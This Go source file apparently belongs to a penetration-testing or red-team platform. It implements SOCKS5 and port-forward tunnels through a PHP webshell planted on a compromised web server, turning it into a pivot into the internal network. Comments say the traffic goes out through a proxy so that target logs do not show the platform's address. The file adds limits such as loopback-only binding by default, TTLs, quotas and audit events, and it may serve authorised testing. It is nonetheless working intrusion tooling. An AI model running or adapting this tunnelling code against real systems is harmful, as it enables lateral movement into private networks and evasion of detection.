package webshell

// WebShell SOCKS5 隧道：把「只有一句话马、没有 SSH」的目标变成内网出口。
//
// 与 pivot 包（SSH direct-tcpip）互补：pivot 要求目标开 22 且有凭据；本包只要
// 目标上有一个能跑 PHP 的 WebShell。做法是通过 webshell_upload 把一个专用隧道
// 脚本落到目标 Web 目录，平台与它建立一条 HTTP 长连接，一个连接承载一个 TCP
// channel（见 tunnel_frame.go 的帧协议）。socket 由目标端脚本在它那次请求的
// 生命周期里持有——这是无状态的一句话马能撑起任意 TCP 的关键。
//
// 边界（与 listener / pivot 的立场一致）：
//   - 不做交互式 shell：搬的是字节流，不解析协议、不维护 PTY。
//   - 不落 OS 持久化：隧道脚本是 web 目录里的临时文件，webshell_remove 会清。
//   - 默认只绑回环；绑非回环强制 SOCKS5 认证（Manager 与工具层双重校验）。
//   - TTL 自动关闭、单任务配额、每条连接记账——留着的隧道就是对内网的开放入口。
//
// 出口：channel 请求复用会话的 proxy 配置（transportFor），目标日志里看到的是
// 代理 IP 而不是平台地址，与 exec / upload 的隐身口径一致。

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	// ModeSocks 是在平台回环开的 SOCKS5 入口；ModePortFwd 转发到单个固定目标。
	ModeSocks   = "socks"
	ModePortFwd = "portfwd"

	// 隧道寿命与配额，取值与 pivot 对齐（一次任务横向的合理规模）。
	DefaultTTL  = 2 * time.Hour
	MaxTTL      = 8 * time.Hour
	MaxPerTask  = 8
	maxChannels = 256 // 单条隧道同时存活的 channel 上限

	// dialTimeout 只限制「等目标端 STATUS 响应头」的时间，不限制 channel 生命期。
	dialTimeout = 20 * time.Second
	// pingInterval / pingMaxFail：HTTP 长连接没有 SSH keepalive，改用独立探测请求。
	pingInterval = 60 * time.Second
	pingMaxFail  = 3
	// socksHandshakeTimeout 是 SOCKS 客户端完成协商的上限。
	socksHandshakeTimeout = 30 * time.Second
)

// TunnelOptions 是一次建隧道的输入。
type TunnelOptions struct {
	TaskID int64
	// Session 是已登记的 webshell 会话名——出口代理与自定义 header 从它继承。
	Session string
	// TunnelURL 是目标端隧道脚本的访问地址（由 webshell_upload 落地后得到）。
	TunnelURL string
	Label     string
	Mode      string
	// Target 仅 portfwd 用：最终访问的内网 host:port。
	Target string
	TTL    time.Duration
	// BindHost 默认 127.0.0.1；非回环必须同时给 SocksUser/SocksPass。
	BindHost  string
	SocksUser string
	SocksPass string
	// Token 是与目标端脚本的浅校验密钥：留空则随机生成。真实流程应先用
	// NewTunnelToken() 生成，注入脚本落地后再用它建隧道（见工具层）。
	Token string
}

// connLog 是一条经隧道连接（channel）的记录，只留最近若干条。
type connLog struct {
	At     time.Time `json:"at"`
	Target string    `json:"target"`
	OK     bool      `json:"ok"`
	Err    string    `json:"err,omitempty"`
	Up     int64     `json:"up"`
	Down   int64     `json:"down"`
}

const maxConnLog = 200

// Tunnel 是一条存活（或已死待回收）的隧道。
type Tunnel struct {
	ID        string    `json:"id"`
	TaskID    int64     `json:"task_id"`
	Label     string    `json:"label"`
	Mode      string    `json:"mode"`
	Session   string    `json:"session"`
	TunnelURL string    `json:"tunnel_url"` // 不含 query 里的凭据
	Listen    string    `json:"listen"`
	Target    string    `json:"target,omitempty"`
	SocksURL  string    `json:"socks_url,omitempty"`
	HasAuth   bool      `json:"has_auth"`
	CreatedAt time.Time `json:"created_at"`
	ExpiresAt time.Time `json:"expires_at"`
	Alive     bool      `json:"alive"`
	LastError string    `json:"last_error,omitempty"`

	Conns     int64 `json:"conns"`
	Fails     int64 `json:"fails"`
	BytesUp   int64 `json:"bytes_up"`
	BytesDown int64 `json:"bytes_down"`
	ActiveNow int64 `json:"active_now"`

	// 运行期状态（不进 View）
	sess          Session
	client        *http.Client
	ctx           context.Context
	cancel        context.CancelFunc
	listener      net.Listener
	auth          *socksAuth
	egress        string
	unredactedURL string // 可拨的原始 URL；View 只回传 redactURL 后的
	token         string // 与目标端脚本的浅校验密钥，绝不进 View/API
	closeOne      sync.Once
	closed        chan struct{}

	mu  sync.Mutex
	log []connLog

	conns     atomic.Int64
	fails     atomic.Int64
	up        atomic.Int64
	down      atomic.Int64
	activeNow atomic.Int64
	channels  atomic.Int64
}

// TunnelView 是可安全回传的快照：不含会话参数名、代理账密、任何 secret。
type TunnelView struct {
	ID        string    `json:"id"`
	TaskID    int64     `json:"task_id"`
	Label     string    `json:"label"`
	Mode      string    `json:"mode"`
	Session   string    `json:"session"`
	TunnelURL string    `json:"tunnel_url"`
	Listen    string    `json:"listen"`
	Target    string    `json:"target,omitempty"`
	SocksURL  string    `json:"socks_url,omitempty"`
	HasAuth   bool      `json:"has_auth"`
	Egress    string    `json:"egress"`
	CreatedAt time.Time `json:"created_at"`
	ExpiresAt time.Time `json:"expires_at"`
	TTLSec    int64     `json:"ttl_sec"`
	Alive     bool      `json:"alive"`
	LastError string    `json:"last_error,omitempty"`
	Conns     int64     `json:"conns"`
	Fails     int64     `json:"fails"`
	BytesUp   int64     `json:"bytes_up"`
	BytesDown int64     `json:"bytes_down"`
	ActiveNow int64     `json:"active_now"`
	Recent    []connLog `json:"recent,omitempty"`
}

func (t *Tunnel) recordConn(e connLog) {
	t.mu.Lock()
	t.log = append(t.log, e)
	if len(t.log) > maxConnLog {
		t.log = t.log[len(t.log)-maxConnLog:]
	}
	t.mu.Unlock()
}

func (t *Tunnel) recentConns(limit int) []connLog {
	t.mu.Lock()
	defer t.mu.Unlock()
	if limit <= 0 || limit > len(t.log) {
		limit = len(t.log)
	}
	out := make([]connLog, limit)
	copy(out, t.log[len(t.log)-limit:])
	return out
}

// View 生成快照（含最近连接记录）。
func (t *Tunnel) View(recent int) TunnelView {
	ttl := int64(time.Until(t.ExpiresAt).Seconds())
	if ttl < 0 {
		ttl = 0
	}
	v := TunnelView{
		ID: t.ID, TaskID: t.TaskID, Label: t.Label, Mode: t.Mode,
		Session: t.Session, TunnelURL: redactURL(t.TunnelURL), Listen: t.Listen,
		Target: t.Target, SocksURL: t.SocksURL, HasAuth: t.HasAuth, Egress: t.egress,
		CreatedAt: t.CreatedAt, ExpiresAt: t.ExpiresAt, TTLSec: ttl,
		Alive: t.Alive, LastError: t.LastError,
		Conns: t.conns.Load(), Fails: t.fails.Load(),
		BytesUp: t.up.Load(), BytesDown: t.down.Load(), ActiveNow: t.activeNow.Load(),
	}
	if recent > 0 {
		v.Recent = t.recentConns(recent)
	}
	return v
}

// TunnelEvent 是审计事件，由 server 注入写进归属任务的 activity。
type TunnelEvent struct {
	Kind   string // open / close / ttl / dead
	ID     string
	TaskID int64
	Label  string
	Target string
	Detail string
}

// TunnelManager 是进程级隧道台账，与 listener.Manager / pivot.Manager 同形态：
// 只活在内存，进程重启后由 OS 回收连接，不做磁盘持久化（持久化等于给重启后的
// 平台一个指向已不存在 channel 的假条目）。
type TunnelManager struct {
	mu       sync.RWMutex
	tunnels  map[string]*Tunnel
	sessions *Manager
	closed   bool
	OnEvent  func(TunnelEvent)
}

// NewTunnelManager 建台账。sessions 为已登记的 webshell 会话库；传 nil 时 Open
// 会直接报错（避免建出一条永远拨不通的隧道）。
func NewTunnelManager(sessions *Manager) *TunnelManager {
	return &TunnelManager{tunnels: map[string]*Tunnel{}, sessions: sessions}
}

func (m *TunnelManager) emit(ev TunnelEvent) {
	if m != nil && m.OnEvent != nil {
		m.OnEvent(ev)
	}
}

func newTunnelID() string {
	var b [8]byte
	if _, err := rand.Read(b[:]); err != nil {
		return fmt.Sprintf("wpt-%d", time.Now().UnixNano())
	}
	return "wpt-" + hex.EncodeToString(b[:])
}

func normalizeTunnelTTL(d time.Duration) time.Duration {
	if d <= 0 {
		return DefaultTTL
	}
	if d > MaxTTL {
		return MaxTTL
	}
	return d
}

// isLoopbackHost 判断绑定地址是否只在本机。空串按回环处理。
func isLoopbackHost(h string) bool {
	h = strings.TrimSpace(h)
	if h == "" || strings.EqualFold(h, "localhost") {
		return true
	}
	ip := net.ParseIP(h)
	return ip != nil && ip.IsLoopback()
}

// Open 建隧道。返回时 SOCKS5 入口已可连。
func (m *TunnelManager) Open(ctx context.Context, opts TunnelOptions) (*Tunnel, error) {
	if m == nil || m.sessions == nil {
		return nil, fmt.Errorf("webshell 隧道 manager 未初始化")
	}
	m.mu.RLock()
	closed := m.closed
	m.mu.RUnlock()
	if closed {
		return nil, fmt.Errorf("webshell 隧道 manager 已关闭")
	}

	mode := strings.ToLower(strings.TrimSpace(opts.Mode))
	if mode == "" {
		mode = ModeSocks
	}
	if mode != ModeSocks && mode != ModePortFwd {
		return nil, fmt.Errorf("mode 只能是 %s 或 %s", ModeSocks, ModePortFwd)
	}
	sess, err := m.sessions.Get(strings.TrimSpace(opts.Session))
	if err != nil {
		return nil, fmt.Errorf("会话不可用: %w", err)
	}
	if sess.TaskID != 0 && opts.TaskID != 0 && sess.TaskID != opts.TaskID {
		return nil, fmt.Errorf("会话属于别的任务，不能跨任务建隧道")
	}
	rawURL := strings.TrimSpace(opts.TunnelURL)
	u, err := url.Parse(rawURL)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Host == "" {
		return nil, fmt.Errorf("tunnel_url 必须是 http(s):// 开头的完整地址")
	}
	if mode == ModePortFwd {
		if strings.TrimSpace(opts.Target) == "" || !strings.Contains(opts.Target, ":") {
			return nil, fmt.Errorf("portfwd 模式必须给 target（内网 host:port）")
		}
	}
	if opts.TaskID > 0 {
		m.mu.RLock()
		n := 0
		for _, t := range m.tunnels {
			if t.TaskID == opts.TaskID && t.Alive {
				n++
			}
		}
		m.mu.RUnlock()
		if n >= MaxPerTask {
			return nil, fmt.Errorf("本任务已有 %d 条存活隧道（上限 %d），先关掉不用的", n, MaxPerTask)
		}
	}

	// 入口绑定：非回环必须带认证。工具层与 HTTP 层也要校验，这里再兜一次。
	bind := strings.TrimSpace(opts.BindHost)
	hasAuth := opts.SocksUser != "" || opts.SocksPass != ""
	if bind == "" {
		bind = "127.0.0.1"
	}
	if !isLoopbackHost(bind) && !hasAuth {
		return nil, fmt.Errorf("绑定 %s 必须同时设置 socks_user/socks_pass：否则等于把内网入口开放给同网段任何人", bind)
	}

	tr, egress, err := transportFor(sess)
	if err != nil {
		return nil, err
	}
	tr.ResponseHeaderTimeout = dialTimeout
	client := &http.Client{Transport: tr}
	tctx, cancel := context.WithCancel(ctx)
	token := strings.TrimSpace(opts.Token)
	if token == "" {
		token = NewTunnelToken()
	}

	t := &Tunnel{
		ID: newTunnelID(), TaskID: opts.TaskID, Label: strings.TrimSpace(opts.Label),
		Mode: mode, Session: strings.TrimSpace(opts.Session), TunnelURL: redactURL(rawURL),
		Target: strings.TrimSpace(opts.Target), HasAuth: hasAuth,
		CreatedAt: time.Now(), ExpiresAt: time.Now().Add(normalizeTunnelTTL(opts.TTL)),
		Alive: true, sess: sess, client: client, ctx: tctx, cancel: cancel,
		closed: make(chan struct{}), egress: egress, unredactedURL: rawURL, token: token,
	}
	if t.Label == "" {
		t.Label = t.Session
	}
	if hasAuth {
		t.auth = &socksAuth{user: opts.SocksUser, pass: opts.SocksPass}
	}

	ln, err := net.Listen("tcp", net.JoinHostPort(bind, "0"))
	if err != nil {
		cancel()
		return nil, fmt.Errorf("监听入口失败: %w", err)
	}
	t.listener = ln
	t.Listen = ln.Addr().String()
	if mode == ModeSocks {
		t.SocksURL = "socks5://" + t.Listen
		if hasAuth {
			t.SocksURL = fmt.Sprintf("socks5://%s:%s@%s", opts.SocksUser, opts.SocksPass, t.Listen)
		}
	}

	m.mu.Lock()
	if m.closed {
		m.mu.Unlock()
		ln.Close()
		cancel()
		return nil, fmt.Errorf("webshell 隧道 manager 已关闭")
	}
	if opts.TaskID > 0 {
		n := 0
		for _, x := range m.tunnels {
			if x.TaskID == opts.TaskID && x.Alive {
				n++
			}
		}
		if n >= MaxPerTask {
			m.mu.Unlock()
			ln.Close()
			cancel()
			return nil, fmt.Errorf("本任务已有 %d 条存活隧道（上限 %d）", n, MaxPerTask)
		}
	}
	m.tunnels[t.ID] = t
	m.mu.Unlock()

	// 先探活：目标端脚本没落地 / URL 填错时立刻失败，而不是开一条永远拨不通的隧道。
	if err := t.probe(ctx); err != nil {
		_ = m.Close(t.ID)
		return nil, fmt.Errorf("目标端隧道脚本不可用: %w", err)
	}

	go t.serve()
	go t.keepalive(pingInterval, pingMaxFail)
	time.AfterFunc(time.Until(t.ExpiresAt), func() {
		t.LastError = "TTL 到期自动关闭"
		t.close()
		m.mu.Lock()
		delete(m.tunnels, t.ID)
		m.mu.Unlock()
		m.emit(TunnelEvent{Kind: "ttl", ID: t.ID, TaskID: t.TaskID, Label: t.Label})
	})
	m.emit(TunnelEvent{Kind: "open", ID: t.ID, TaskID: t.TaskID, Label: t.Label, Detail: "打开 " + t.SocksURL})
	return t, nil
}

// serve 按模式跑 accept 循环。
func (t *Tunnel) serve() {
	for {
		conn, err := t.listener.Accept()
		if err != nil {
			select {
			case <-t.closed:
				return
			default:
			}
			time.Sleep(50 * time.Millisecond)
			continue
		}
		go func(c net.Conn) {
			if t.Mode == ModeSocks {
				t.serveSocksConn(c)
				return
			}
			t.serveForwardConn(c)
		}(conn)
	}
}

// keepalive 定期发独立探测请求。连续失败判定脚本已失效。
func (t *Tunnel) keepalive(every time.Duration, maxFail int) {
	tk := time.NewTicker(every)
	defer tk.Stop()
	fails := 0
	for {
		select {
		case <-t.closed:
			return
		case <-tk.C:
			if err := t.probe(t.ctx); err != nil {
				fails++
				if fails >= maxFail {
					t.LastError = "隧道脚本连续探测失败: " + err.Error()
					t.close()
					return
				}
				continue
			}
			fails = 0
		}
	}
}

// probe 开一条短连接：请求体写一个 PING 帧，读响应体的 PONG。
// 也用于 Open 前探活——目标端脚本没落地 / URL 填错时立刻失败，而不是开一条
// 永远拨不通的隧道。
func (t *Tunnel) probe(ctx context.Context) error {
	ctx, cancel := context.WithTimeout(ctx, dialTimeout)
	defer cancel()
	pr, pw := io.Pipe()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, t.rawTunnelURL(), pr)
	if err != nil {
		return err
	}
	t.applyHeaders(req)

	type doResult struct {
		resp *http.Response
		err  error
	}
	doCh := make(chan doResult, 1)
	go func() {
		resp, err := t.client.Do(req)
		doCh <- doResult{resp, err}
	}()

	writeErr := make(chan error, 1)
	go func() {
		err := writeFrame(pw, framePing, nil)
		_ = pw.Close() // 发完就关写方向，让脚本知道没有后续帧
		writeErr <- err
	}()

	var resp *http.Response
	select {
	case r := <-doCh:
		if r.err != nil {
			_ = pw.CloseWithError(r.err)
			return r.err
		}
		resp = r.resp
		<-writeErr
	case err := <-writeErr:
		if err != nil {
			_ = pr.CloseWithError(err)
			return err
		}
		r := <-doCh
		if r.err != nil {
			return r.err
		}
		resp = r.resp
	case <-ctx.Done():
		_ = pr.CloseWithError(ctx.Err())
		_ = pw.CloseWithError(ctx.Err())
		return ctx.Err()
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	typ, _, err := readFrame(resp.Body)
	if err != nil {
		return fmt.Errorf("读探测应答失败: %w", err)
	}
	if typ != framePong {
		return fmt.Errorf("探测应答类型错误 0x%02x", typ)
	}
	return nil
}

func (t *Tunnel) rawTunnelURL() string {
	// View 里是脱敏后的，这里要原始 URL 才能拨。redactURL 只动 query 值，
	// 但探测请求必须带原值，因此从 sess 之外单独保存。见 unredactedURL。
	return t.unredactedURL
}

func (t *Tunnel) applyHeaders(req *http.Request) {
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", defaultUA(t.sess))
	req.Header.Set("Accept", "*/*")
	for k, v := range t.sess.Header {
		req.Header.Set(k, v)
	}
}

func defaultUA(sess Session) string {
	if ua := strings.TrimSpace(sess.UserAgent); ua != "" {
		return ua
	}
	return DefaultUA
}

// dialChannel 开一条到内网目标的 channel，返回可直接读写的 net.Conn。
func (t *Tunnel) dialChannel(ctx context.Context, target string) (net.Conn, error) {
	if t.channels.Add(1) > maxChannels {
		t.channels.Add(-1)
		return nil, fmt.Errorf("本隧道 channel 已达上限 %d", maxChannels)
	}
	pr, pw := io.Pipe()
	req, err := http.NewRequestWithContext(t.ctx, http.MethodPost, t.rawTunnelURL(), pr)
	if err != nil {
		t.channels.Add(-1)
		return nil, err
	}
	t.applyHeaders(req)

	type doResult struct {
		resp *http.Response
		err  error
	}
	doCh := make(chan doResult, 1)
	go func() {
		resp, err := t.client.Do(req)
		doCh <- doResult{resp, err}
	}()

	// OPEN 帧要等 transport 开始读请求体才能写完；同时若 Do 先失败（脚本挂了），
	// 必须立刻放开写入，否则 io.Pipe.Write 永久阻塞。
	openPayload := []byte(target + "|" + t.token)
	openErr := make(chan error, 1)
	go func() { openErr <- writeFrame(pw, frameOpen, openPayload) }()
	select {
	case r := <-doCh:
		if r.err != nil {
			_ = pw.CloseWithError(r.err)
			t.channels.Add(-1)
			return nil, fmt.Errorf("连接隧道脚本失败: %w", r.err)
		}
		if err := <-openErr; err != nil {
			r.resp.Body.Close()
			t.channels.Add(-1)
			return nil, err
		}
		return t.finishChannel(r.resp, pw, target)
	case err := <-openErr:
		if err != nil {
			t.channels.Add(-1)
			return nil, err
		}
		r := <-doCh // OPEN 写完后等响应头
		if r.err != nil {
			_ = pw.Close()
			t.channels.Add(-1)
			return nil, fmt.Errorf("连接隧道脚本失败: %w", r.err)
		}
		return t.finishChannel(r.resp, pw, target)
	case <-ctx.Done():
		_ = pr.CloseWithError(ctx.Err())
		_ = pw.CloseWithError(ctx.Err())
		t.channels.Add(-1)
		return nil, ctx.Err()
	}
}

// finishChannel 读目标端的 STATUS 帧，成功后封装成 net.Conn。
func (t *Tunnel) finishChannel(resp *http.Response, pw *io.PipeWriter, target string) (net.Conn, error) {
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		resp.Body.Close()
		pw.Close()
		t.channels.Add(-1)
		return nil, fmt.Errorf("隧道脚本返回 HTTP %d", resp.StatusCode)
	}
	typ, payload, err := readFrame(resp.Body)
	if err != nil {
		resp.Body.Close()
		pw.Close()
		t.channels.Add(-1)
		return nil, fmt.Errorf("读 STATUS 失败: %w", err)
	}
	if typ != frameStatus {
		resp.Body.Close()
		pw.Close()
		t.channels.Add(-1)
		return nil, fmt.Errorf("首帧不是 STATUS（0x%02x）", typ)
	}
	if ok, msg := parseStatus(payload); !ok {
		resp.Body.Close()
		pw.Close()
		t.channels.Add(-1)
		return nil, fmt.Errorf("目标端连不上 %s: %s", target, msg)
	}
	return &channelConn{tunnel: t, w: pw, r: resp.Body, target: target}, nil
}

// channelConn 把一个 HTTP 长连接的两条 body 包装成 net.Conn：
// Write → 请求体 DATA 帧；Read ← 响应体 DATA 帧。
type channelConn struct {
	tunnel *Tunnel
	w      *io.PipeWriter
	r      io.ReadCloser
	target string
	left   []byte // Read 的 p 小于一帧时的残留
	mu     sync.Mutex
	closed bool
}

func (c *channelConn) Read(p []byte) (int, error) {
	if len(c.left) > 0 {
		n := copy(p, c.left)
		c.left = c.left[n:]
		return n, nil
	}
	for {
		typ, payload, err := readFrame(c.r)
		if err != nil {
			return 0, err
		}
		switch typ {
		case frameData:
			if len(payload) == 0 {
				continue
			}
			n := copy(p, payload)
			if n < len(payload) {
				c.left = payload[n:]
			}
			return n, nil
		case framePong:
			continue // 探测穿插在同一响应流里，忽略
		case frameEOF, frameClose:
			return 0, io.EOF
		default:
			return 0, fmt.Errorf("channel 收到未知帧 0x%02x", typ)
		}
	}
}

func (c *channelConn) Write(p []byte) (int, error) {
	if len(p) == 0 {
		return 0, nil
	}
	if err := writeFrame(c.w, frameData, p); err != nil {
		return 0, err
	}
	return len(p), nil
}

// CloseWrite 半关：发 EOF 帧，让目标端知道本方向结束，但对端还能继续吐数据。
func (c *channelConn) CloseWrite() error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.closed {
		return nil
	}
	return writeFrame(c.w, frameEOF, nil)
}

func (c *channelConn) Close() error {
	c.mu.Lock()
	if c.closed {
		c.mu.Unlock()
		return nil
	}
	c.closed = true
	c.mu.Unlock()
	_ = writeFrame(c.w, frameClose, nil)
	_ = c.w.Close()
	_ = c.r.Close()
	c.tunnel.channels.Add(-1)
	return nil
}

func (c *channelConn) LocalAddr() net.Addr  { return channelAddr(c.tunnel.Listen) }
func (c *channelConn) RemoteAddr() net.Addr { return channelAddr(c.target) }

// Deadline 方法是 net.Conn 接口要求；channel 的生命周期由 tunnel ctx 与 HTTP 超时控制，
// 这里记录但不强制，避免 SOCKS 握手调用的 SetDeadline 意外砍断长连接。
func (c *channelConn) SetDeadline(time.Time) error      { return nil }
func (c *channelConn) SetReadDeadline(time.Time) error  { return nil }
func (c *channelConn) SetWriteDeadline(time.Time) error { return nil }

type channelAddr string

func (a channelAddr) Network() string { return "tcp" }
func (a channelAddr) String() string  { return string(a) }

func (t *Tunnel) close() {
	t.closeOne.Do(func() {
		t.Alive = false
		close(t.closed)
		if t.listener != nil {
			_ = t.listener.Close()
		}
		if t.cancel != nil {
			t.cancel()
		}
		if t.client != nil {
			t.client.CloseIdleConnections()
		}
	})
}

// Close 关闭隧道（幂等）。
func (m *TunnelManager) Close(id string) error {
	m.mu.RLock()
	t, ok := m.tunnels[id]
	m.mu.RUnlock()
	if !ok {
		return fmt.Errorf("隧道 %s 不存在", id)
	}
	wasAlive := t.Alive
	t.close()
	m.mu.Lock()
	delete(m.tunnels, id)
	m.mu.Unlock()
	if wasAlive {
		m.emit(TunnelEvent{Kind: "close", ID: id, TaskID: t.TaskID, Label: t.Label})
	}
	return nil
}

// CloseTask 关闭某任务的全部隧道。
func (m *TunnelManager) CloseTask(taskID int64) int {
	m.mu.Lock()
	var ids []string
	for id, t := range m.tunnels {
		if t.TaskID == taskID {
			ids = append(ids, id)
		}
	}
	m.mu.Unlock()
	for _, id := range ids {
		_ = m.Close(id)
	}
	return len(ids)
}

// CloseAll 关闭全部隧道（进程退出）。
func (m *TunnelManager) CloseAll() {
	if m == nil {
		return
	}
	m.mu.Lock()
	m.closed = true
	ids := make([]string, 0, len(m.tunnels))
	for id := range m.tunnels {
		ids = append(ids, id)
	}
	m.mu.Unlock()
	for _, id := range ids {
		_ = m.Close(id)
	}
}

// Get / List / Stats 与 pivot 同口径。
func (m *TunnelManager) Get(id string) (*Tunnel, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	t, ok := m.tunnels[id]
	return t, ok
}

func (m *TunnelManager) List(taskID int64) []*Tunnel {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*Tunnel, 0, len(m.tunnels))
	for _, t := range m.tunnels {
		if taskID > 0 && t.TaskID != taskID {
			continue
		}
		out = append(out, t)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].CreatedAt.After(out[j].CreatedAt) })
	return out
}

type TunnelStats struct {
	Tunnels  int   `json:"tunnels"`
	Alive    int   `json:"alive"`
	Socks    int   `json:"socks"`
	PortFwd  int   `json:"portfwd"`
	Tasks    int   `json:"tasks"`
	Conns    int64 `json:"conns"`
	Fails    int64 `json:"fails"`
	BytesUp  int64 `json:"bytes_up"`
	BytesDn  int64 `json:"bytes_down"`
	ActiveNo int64 `json:"active_now"`
}

func (m *TunnelManager) Stats() TunnelStats {
	m.mu.RLock()
	defer m.mu.RUnlock()
	var s TunnelStats
	tasks := map[int64]bool{}
	s.Tunnels = len(m.tunnels)
	for _, t := range m.tunnels {
		if t.Alive {
			s.Alive++
		}
		switch t.Mode {
		case ModeSocks:
			s.Socks++
		case ModePortFwd:
			s.PortFwd++
		}
		if t.TaskID > 0 {
			tasks[t.TaskID] = true
		}
		s.Conns += t.conns.Load()
		s.Fails += t.fails.Load()
		s.BytesUp += t.up.Load()
		s.BytesDn += t.down.Load()
		s.ActiveNo += t.activeNow.Load()
	}
	s.Tasks = len(tasks)
	return s
}

// InjectForTest 塞一条没有真实链路的隧道，供归属/过滤/配额等纯逻辑测试。
// 生产代码不得调用。
func (m *TunnelManager) InjectForTest(t *Tunnel) {
	if t.closed == nil {
		t.closed = make(chan struct{})
	}
	m.mu.Lock()
	m.tunnels[t.ID] = t
	m.mu.Unlock()
}
